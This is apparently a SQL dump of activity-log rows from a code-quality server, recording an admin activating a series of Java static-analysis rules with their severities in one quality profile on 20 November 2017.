INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1213, '2017-11-20 10:14:43.451', 'admin', 'key=java-lena-qp_15-78480:squid:S1133;ruleKey=squid:S1133;profileKey=java-lena-qp_15-78480;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EP7bbGRdfPp-qwg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1214, '2017-11-20 10:14:43.517', 'admin', 'key=java-lena-qp_15-78480:squid:S1134;ruleKey=squid:S1134;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EQ9bbGRdfPp-qwh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1215, '2017-11-20 10:14:43.543', 'admin', 'key=java-lena-qp_15-78480:squid:S1135;ruleKey=squid:S1135;profileKey=java-lena-qp_15-78480;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ERXbbGRdfPp-qwi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1216, '2017-11-20 10:14:43.608', 'admin', 'key=java-lena-qp_15-78480:squid:S1141;ruleKey=squid:S1141;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ESYbbGRdfPp-qwj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1221, '2017-11-20 10:14:43.776', 'admin', 'key=java-lena-qp_15-78480:squid:S1153;ruleKey=squid:S1153;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EVAbbGRdfPp-qwo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1222, '2017-11-20 10:14:43.808', 'admin', 'key=java-lena-qp_15-78480:squid:S1155;ruleKey=squid:S1155;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EVgbbGRdfPp-qwp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1223, '2017-11-20 10:14:43.827', 'admin', 'key=java-lena-qp_15-78480:squid:S1157;ruleKey=squid:S1157;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EVzbbGRdfPp-qwq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1224, '2017-11-20 10:14:43.862', 'admin', 'key=java-lena-qp_15-78480:squid:S1158;ruleKey=squid:S1158;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EWWbbGRdfPp-qwr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1225, '2017-11-20 10:14:43.899', 'admin', 'key=java-lena-qp_15-78480:squid:S1161;ruleKey=squid:S1161;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EW7bbGRdfPp-qws');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1226, '2017-11-20 10:14:43.936', 'admin', 'key=java-lena-qp_15-78480:squid:S1163;ruleKey=squid:S1163;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EXgbbGRdfPp-qwt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1227, '2017-11-20 10:14:43.982', 'admin', 'key=java-lena-qp_15-78480:squid:S1165;ruleKey=squid:S1165;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EYObbGRdfPp-qwu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1228, '2017-11-20 10:14:44.015', 'admin', 'key=java-lena-qp_15-78480:squid:S1168;ruleKey=squid:S1168;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EYvbbGRdfPp-qwv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1229, '2017-11-20 10:14:44.043', 'admin', 'key=java-lena-qp_15-78480:squid:S1170;ruleKey=squid:S1170;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EZLbbGRdfPp-qww');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1230, '2017-11-20 10:14:44.132', 'admin', 'key=java-lena-qp_15-78480:squid:S1171;ruleKey=squid:S1171;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EakbbGRdfPp-qwx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1231, '2017-11-20 10:14:44.212', 'admin', 'key=java-lena-qp_15-78480:squid:S1172;ruleKey=squid:S1172;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Eb0bbGRdfPp-qwy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1232, '2017-11-20 10:14:44.274', 'admin', 'key=java-lena-qp_15-78480:squid:S1174;ruleKey=squid:S1174;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EcybbGRdfPp-qwz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1233, '2017-11-20 10:14:44.346', 'admin', 'key=java-lena-qp_15-78480:squid:S1175;ruleKey=squid:S1175;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ed6bbGRdfPp-qw0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1234, '2017-11-20 10:14:44.393', 'admin', 'key=java-lena-qp_15-78480:squid:S1181;ruleKey=squid:S1181;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EepbbGRdfPp-qw1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1235, '2017-11-20 10:14:44.421', 'admin', 'key=java-lena-qp_15-78480:squid:S1182;ruleKey=squid:S1182;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EfFbbGRdfPp-qw2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1236, '2017-11-20 10:14:44.46', 'admin', 'key=java-lena-qp_15-78480:squid:S1185;ruleKey=squid:S1185;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EfsbbGRdfPp-qw3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1237, '2017-11-20 10:14:44.501', 'admin', 'key=java-lena-qp_15-78480:squid:S1186;ruleKey=squid:S1186;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EgVbbGRdfPp-qw4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1238, '2017-11-20 10:14:44.551', 'admin', 'key=java-lena-qp_15-78480:squid:S1190;ruleKey=squid:S1190;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EhHbbGRdfPp-qw5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1239, '2017-11-20 10:14:44.592', 'admin', 'key=java-lena-qp_15-78480:squid:S1191;ruleKey=squid:S1191;profileKey=java-lena-qp_15-78480;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EhwbbGRdfPp-qw6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1240, '2017-11-20 10:14:44.629', 'admin', 'key=java-lena-qp_15-78480:squid:S1192;ruleKey=squid:S1192;profileKey=java-lena-qp_15-78480;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EiVbbGRdfPp-qw7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1241, '2017-11-20 10:14:44.669', 'admin', 'key=java-lena-qp_15-78480:squid:S1193;ruleKey=squid:S1193;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ei9bbGRdfPp-qw8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1242, '2017-11-20 10:14:44.711', 'admin', 'key=java-lena-qp_15-78480:squid:S1195;ruleKey=squid:S1195;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EjnbbGRdfPp-qw9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1243, '2017-11-20 10:14:44.751', 'admin', 'key=java-lena-qp_15-78480:squid:S1197;ruleKey=squid:S1197;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EkPbbGRdfPp-qw-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1244, '2017-11-20 10:14:44.78', 'admin', 'key=java-lena-qp_15-78480:squid:S1199;ruleKey=squid:S1199;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EksbbGRdfPp-qw_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1245, '2017-11-20 10:14:44.814', 'admin', 'key=java-lena-qp_15-78480:squid:S1201;ruleKey=squid:S1201;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ElObbGRdfPp-qxA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1246, '2017-11-20 10:14:44.854', 'admin', 'key=java-lena-qp_15-78480:squid:S1206;ruleKey=squid:S1206;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7El2bbGRdfPp-qxB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1247, '2017-11-20 10:14:44.897', 'admin', 'key=java-lena-qp_15-78480:squid:S1210;ruleKey=squid:S1210;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EmhbbGRdfPp-qxC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1248, '2017-11-20 10:14:44.938', 'admin', 'key=java-lena-qp_15-78480:squid:S1214;ruleKey=squid:S1214;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EnKbbGRdfPp-qxD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1249, '2017-11-20 10:14:44.968', 'admin', 'key=java-lena-qp_15-78480:squid:S1215;ruleKey=squid:S1215;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EnobbGRdfPp-qxE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1250, '2017-11-20 10:14:45.01', 'admin', 'key=java-lena-qp_15-78480:squid:S1217;ruleKey=squid:S1217;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EoSbbGRdfPp-qxF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1251, '2017-11-20 10:14:45.051', 'admin', 'key=java-lena-qp_15-78480:squid:S1219;ruleKey=squid:S1219;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Eo7bbGRdfPp-qxG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1252, '2017-11-20 10:14:45.094', 'admin', 'key=java-lena-qp_15-78480:squid:S1220;ruleKey=squid:S1220;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EpmbbGRdfPp-qxH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1253, '2017-11-20 10:14:45.164', 'admin', 'key=java-lena-qp_15-78480:squid:S1221;ruleKey=squid:S1221;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EqsbbGRdfPp-qxI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1254, '2017-11-20 10:14:45.245', 'admin', 'key=java-lena-qp_15-78480:squid:S1223;ruleKey=squid:S1223;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Er9bbGRdfPp-qxJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1255, '2017-11-20 10:14:45.311', 'admin', 'key=java-lena-qp_15-78480:squid:S1226;ruleKey=squid:S1226;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Es_bbGRdfPp-qxK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1256, '2017-11-20 10:14:45.403', 'admin', 'key=java-lena-qp_15-78480:squid:S1264;ruleKey=squid:S1264;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EubbbGRdfPp-qxL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1257, '2017-11-20 10:14:45.428', 'admin', 'key=java-lena-qp_15-78480:squid:S128;ruleKey=squid:S128;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Eu0bbGRdfPp-qxM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1258, '2017-11-20 10:14:45.462', 'admin', 'key=java-lena-qp_15-78480:squid:S1301;ruleKey=squid:S1301;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EvWbbGRdfPp-qxN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1259, '2017-11-20 10:14:45.504', 'admin', 'key=java-lena-qp_15-78480:squid:S1313;ruleKey=squid:S1313;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EwAbbGRdfPp-qxO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1260, '2017-11-20 10:14:45.537', 'admin', 'key=java-lena-qp_15-78480:squid:S1317;ruleKey=squid:S1317;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EwhbbGRdfPp-qxP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1261, '2017-11-20 10:14:45.57', 'admin', 'key=java-lena-qp_15-78480:squid:S1319;ruleKey=squid:S1319;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ExCbbGRdfPp-qxQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1262, '2017-11-20 10:14:45.621', 'admin', 'key=java-lena-qp_15-78480:squid:S135;ruleKey=squid:S135;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ex1bbGRdfPp-qxR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1263, '2017-11-20 10:14:45.667', 'admin', 'key=java-lena-qp_15-78480:squid:S1444;ruleKey=squid:S1444;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EyjbbGRdfPp-qxS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1264, '2017-11-20 10:14:45.709', 'admin', 'key=java-lena-qp_15-78480:squid:S1450;ruleKey=squid:S1450;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EzNbbGRdfPp-qxT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1265, '2017-11-20 10:14:45.748', 'admin', 'key=java-lena-qp_15-78480:squid:S1452;ruleKey=squid:S1452;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7Ez0bbGRdfPp-qxU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1266, '2017-11-20 10:14:45.793', 'admin', 'key=java-lena-qp_15-78480:squid:S1479;ruleKey=squid:S1479;profileKey=java-lena-qp_15-78480;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E0hbbGRdfPp-qxV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1267, '2017-11-20 10:14:45.835', 'admin', 'key=java-lena-qp_15-78480:squid:S1481;ruleKey=squid:S1481;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E1LbbGRdfPp-qxW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1268, '2017-11-20 10:14:45.894', 'admin', 'key=java-lena-qp_15-78480:squid:S1488;ruleKey=squid:S1488;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E2GbbGRdfPp-qxX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1269, '2017-11-20 10:14:45.936', 'admin', 'key=java-lena-qp_15-78480:squid:S1596;ruleKey=squid:S1596;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E2wbbGRdfPp-qxY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1270, '2017-11-20 10:14:45.974', 'admin', 'key=java-lena-qp_15-78480:squid:S1598;ruleKey=squid:S1598;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E3WbbGRdfPp-qxZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1271, '2017-11-20 10:14:46.015', 'admin', 'key=java-lena-qp_15-78480:squid:S1602;ruleKey=squid:S1602;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E3_bbGRdfPp-qxa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1272, '2017-11-20 10:14:46.058', 'admin', 'key=java-lena-qp_15-78480:squid:S1604;ruleKey=squid:S1604;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E4qbbGRdfPp-qxb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1273, '2017-11-20 10:14:46.094', 'admin', 'key=java-lena-qp_15-78480:squid:S1607;ruleKey=squid:S1607;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E5ObbGRdfPp-qxc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1274, '2017-11-20 10:14:46.131', 'admin', 'key=java-lena-qp_15-78480:squid:S1610;ruleKey=squid:S1610;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E5zbbGRdfPp-qxd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1275, '2017-11-20 10:14:46.183', 'admin', 'key=java-lena-qp_15-78480:squid:S1611;ruleKey=squid:S1611;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E6nbbGRdfPp-qxe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1276, '2017-11-20 10:14:46.225', 'admin', 'key=java-lena-qp_15-78480:squid:S1612;ruleKey=squid:S1612;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E7RbbGRdfPp-qxf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1277, '2017-11-20 10:14:46.279', 'admin', 'key=java-lena-qp_15-78480:squid:S1640;ruleKey=squid:S1640;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E8GbbGRdfPp-qxg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1278, '2017-11-20 10:14:46.36', 'admin', 'key=java-lena-qp_15-78480:squid:S1643;ruleKey=squid:S1643;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E9YbbGRdfPp-qxh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1279, '2017-11-20 10:14:46.403', 'admin', 'key=java-lena-qp_15-78480:squid:S1656;ruleKey=squid:S1656;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E-DbbGRdfPp-qxi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1280, '2017-11-20 10:14:46.448', 'admin', 'key=java-lena-qp_15-78480:squid:S1659;ruleKey=squid:S1659;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E-wbbGRdfPp-qxj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1281, '2017-11-20 10:14:46.487', 'admin', 'key=java-lena-qp_15-78480:squid:S1700;ruleKey=squid:S1700;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E_XbbGRdfPp-qxk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1282, '2017-11-20 10:14:46.523', 'admin', 'key=java-lena-qp_15-78480:squid:S1710;ruleKey=squid:S1710;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7E_7bbGRdfPp-qxl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1283, '2017-11-20 10:14:46.564', 'admin', 'key=java-lena-qp_15-78480:squid:S1751;ruleKey=squid:S1751;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FAkbbGRdfPp-qxm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1284, '2017-11-20 10:14:46.601', 'admin', 'key=java-lena-qp_15-78480:squid:S1764;ruleKey=squid:S1764;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FBJbbGRdfPp-qxn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1285, '2017-11-20 10:14:46.682', 'admin', 'key=java-lena-qp_15-78480:squid:S1844;ruleKey=squid:S1844;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FCabbGRdfPp-qxo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1286, '2017-11-20 10:14:46.723', 'admin', 'key=java-lena-qp_15-78480:squid:S1845;ruleKey=squid:S1845;profileKey=java-lena-qp_15-78480;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FDDbbGRdfPp-qxp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1287, '2017-11-20 10:14:46.759', 'admin', 'key=java-lena-qp_15-78480:squid:S1849;ruleKey=squid:S1849;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FDnbbGRdfPp-qxq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1288, '2017-11-20 10:14:46.795', 'admin', 'key=java-lena-qp_15-78480:squid:S1854;ruleKey=squid:S1854;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FELbbGRdfPp-qxr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1289, '2017-11-20 10:14:46.835', 'admin', 'key=java-lena-qp_15-78480:squid:S1858;ruleKey=squid:S1858;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FEzbbGRdfPp-qxs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1290, '2017-11-20 10:14:46.871', 'admin', 'key=java-lena-qp_15-78480:squid:S1860;ruleKey=squid:S1860;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FFXbbGRdfPp-qxt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1291, '2017-11-20 10:14:46.908', 'admin', 'key=java-lena-qp_15-78480:squid:S1862;ruleKey=squid:S1862;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FF8bbGRdfPp-qxu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1292, '2017-11-20 10:14:46.944', 'admin', 'key=java-lena-qp_15-78480:squid:S1871;ruleKey=squid:S1871;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FGgbbGRdfPp-qxv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1293, '2017-11-20 10:14:46.983', 'admin', 'key=java-lena-qp_15-78480:squid:S1872;ruleKey=squid:S1872;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FHHbbGRdfPp-qxw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1294, '2017-11-20 10:14:47.019', 'admin', 'key=java-lena-qp_15-78480:squid:S1905;ruleKey=squid:S1905;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FHrbbGRdfPp-qxx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1295, '2017-11-20 10:14:47.056', 'admin', 'key=java-lena-qp_15-78480:squid:S1940;ruleKey=squid:S1940;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FIQbbGRdfPp-qxy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1296, '2017-11-20 10:14:47.091', 'admin', 'key=java-lena-qp_15-78480:squid:S1948;ruleKey=squid:S1948;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FIzbbGRdfPp-qxz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1297, '2017-11-20 10:14:47.132', 'admin', 'key=java-lena-qp_15-78480:squid:S1989;ruleKey=squid:S1989;profileKey=java-lena-qp_15-78480;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FJcbbGRdfPp-qx0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1298, '2017-11-20 10:14:47.187', 'admin', 'key=java-lena-qp_15-78480:squid:S1994;ruleKey=squid:S1994;profileKey=java-lena-qp_15-78480;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7FKTbbGRdfPp-qx1');
